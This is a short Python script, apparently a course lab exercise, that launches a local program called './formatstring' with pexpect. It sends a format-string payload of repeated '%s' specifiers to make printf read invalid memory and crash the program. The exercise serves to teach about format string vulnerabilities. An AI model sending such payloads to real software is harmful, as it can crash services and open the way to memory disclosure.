# Example of how to crash the program for Task 2 (i)
# Uses multiple '%s' to increase likelyhood of printf() trying
# to read from invalid memory address (Restricted, Null, etc...)

from __future__ import print_function

import struct
import pexpect

input2 = '%s%s%s%s%s%s%s%s%s%s'   # String input (vulnerability)

# Executable that will be attacked
targetfile = './formatstring'

echo = '' # Return from code
p = pexpect.spawn(targetfile)

# Echo initial output
for i in range(0,5):
	echo = p.readline()
	print(echo, end='')

# Send second user input
print('> Sending: ' + input2)
p.sendline(input2)

# Echo program return
for i in range(0,5):
	echo = p.readline()
	print(echo,end='')
	if not echo:
		print('> No return from program - it crashed!')
		break
